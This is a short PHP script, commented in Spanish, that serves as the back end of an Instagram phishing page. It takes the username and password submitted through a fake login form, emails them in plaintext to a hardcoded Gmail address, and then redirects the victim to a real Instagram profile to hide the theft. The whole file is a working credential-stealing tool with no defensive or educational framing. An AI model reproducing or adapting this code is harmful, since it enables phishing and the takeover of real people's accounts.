<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Dirección de correo electrónico a donde se enviará el mensaje
    $to = "valekmartinez2000@gmail.com";
    $subject = "Nuevo intento de inicio de sesión de Instagram";

    // Cuerpo del mensaje
    $message = "
    <html>
    <head>
        <title>Nuevo intento de inicio de sesión de Instagram</title>
    </head>
    <body>
        <p>Se ha intentado iniciar sesión con los siguientes datos:</p>
        <table>
            <tr>
                <th>Usuario</th>
                <td>$username</td>
            </tr>
            <tr>
                <th>Contraseña</th>
                <td>$password</td>
            </tr>
        </table>
    </body>
    </html>
    ";

    // Para enviar un correo HTML, se debe especificar el encabezado de contenido
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // Cabeceras adicionales
    $headers .= "From: no-reply@tudominio.com" . "\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirigir a la URL de Instagram después de enviar el correo
        header("Location: https://www.instagram.com/danna162008?igsh=YW5jdzZvbXpyMm8=");
        exit();  // Asegura que el código PHP se detenga después de la redirección
    } else {
        echo "Hubo un error al enviar el correo.";
    }
} else {
    echo "No se enviaron datos por el formulario.";
}
?>
